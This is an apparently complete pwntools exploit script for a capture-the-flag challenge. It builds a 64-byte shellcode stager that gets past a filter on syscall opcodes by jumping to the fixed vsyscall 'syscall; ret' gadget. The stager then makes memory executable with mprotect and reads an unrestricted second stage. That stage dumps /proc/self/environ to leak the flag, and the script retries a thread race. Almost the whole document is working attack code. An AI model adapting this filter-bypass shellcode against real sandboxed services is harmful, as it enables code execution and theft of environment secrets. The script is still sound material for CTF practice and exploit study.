#!/usr/bin/env python3
from pwn import *
import struct
import time

HOST = args.HOST or "upr.challs.ctf.bhackari.it"
PORT = int(args.PORT or 5002)

context.arch = "amd64"
context.os = "linux"

SC2 = 0x13371337000
VSYSCALL_SYSCALL_RET = 0xffffffffff600007

BAD = [b"\x0f\x05", b"\x0f\x07", b"\xcd\x80"]


def check_sc(sc, name):
    assert len(sc) <= 64, f"{name} too long: {len(sc)}"
    for b in BAD:
        assert b not in sc, f"{name} contains bad bytes: {b.hex()}"
    return sc.ljust(64, b"\x90")


# first thread: do nothing forever
sc1 = check_sc(asm("""
loop:
    jmp loop
"""), "sc1")


# second thread: 64-byte stager
#
# It uses the fixed vsyscall page as:
#   0xffffffffff600007: syscall; ret
#
# First syscall:
#   mprotect(0x13371337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
#
# Second syscall:
#   read(0, 0x13371337000, 0x407)
#
# After read returns, the vsyscall "ret" reads its return address from ret2.
# But read() overwrites ret2, so the stage payload must place the desired
# return address exactly at RET2_OFF.
stager_asm = f"""
    /* rdi is still the shellcode page address when the challenge jumps here */

    push 10
    pop rax                 /* SYS_mprotect */

    push 0x1000
    pop rsi

    push 7
    pop rdx                 /* RWX */

    lea rsp, [rip + ret1]
    mov rbx, {VSYSCALL_SYSCALL_RET}
    jmp rbx

ret1:
    .quad cont1

cont1:
    mov rsi, rdi            /* read buffer = shellcode page */
    xor edi, edi            /* fd = stdin */
    xor eax, eax            /* SYS_read */

    /*
       rdx was 7 from mprotect.
       Set dh = 4 => rdx = 0x407.
       Good enough and saves bytes.
    */
    mov dh, 4

    lea rsp, [rip + ret2]
    jmp rbx

ret2:
    .quad 0
"""

sc2_raw = asm(stager_asm, vma=SC2)
log.info(f"stager len = {len(sc2_raw)}")

sc2 = check_sc(sc2_raw, "sc2")
RET2_OFF = len(sc2_raw) - 8
log.info(f"RET2_OFF = {RET2_OFF:#x}")


# real stage, now unrestricted because it is read after sanitize()
stage_code = asm(f"""
    /* open("/proc/self/environ", O_RDONLY) */
    mov eax, 2
    lea rdi, [rip + path]
    xor esi, esi
    xor edx, edx
    syscall

    /* read(fd, {SC2 + 0x800:#x}, 0x1000) */
    mov rdi, rax
    mov rsi, {SC2 + 0x800:#x}
    mov edx, 0x1000
    xor eax, eax
    syscall

    /* write(1, buf, n) */
    mov edx, eax
    mov edi, 1
    mov rsi, {SC2 + 0x800:#x}
    mov eax, 1
    syscall

    /* exit_group(0) */
    mov eax, 231
    xor edi, edi
    syscall

path:
    .asciz "/proc/self/environ"
""")

# Payload read by the stager.
# It overwrites the whole shellcode page.
# At RET2_OFF we must place the return address used by vsyscall's ret.
# We return to SC2 + 0x80, where the real stage starts.
stage = bytearray(b"\x90" * 0x80)
stage[0:2] = b"\xeb\x7e"  # jmp SC2+0x80, useful if execution starts at page base
stage[RET2_OFF:RET2_OFF + 8] = p64(SC2 + 0x80)
stage += stage_code
stage = bytes(stage)

log.info(f"stage len = {len(stage)}")


def attempt():
    io = remote(HOST, PORT)

    io.recvuntil(b"Give me your shellcode:")
    io.send(sc1)

    io.recvuntil(b"Give me your shellcode:")
    io.send(sc2)

    # Give the second thread a tiny head start so it reaches read()
    # before main reaches getc().
    time.sleep(0.03)
    io.send(stage)

    out = io.recvall(timeout=3)
    io.close()
    return out


for i in range(30):
    log.info(f"attempt {i}")
    out = attempt()

    text = out.replace(b"\x00", b"\n")
    print(text.decode(errors="ignore"))

    if b"bhackariCTF{" in out or b"FLAG=" in out:
        break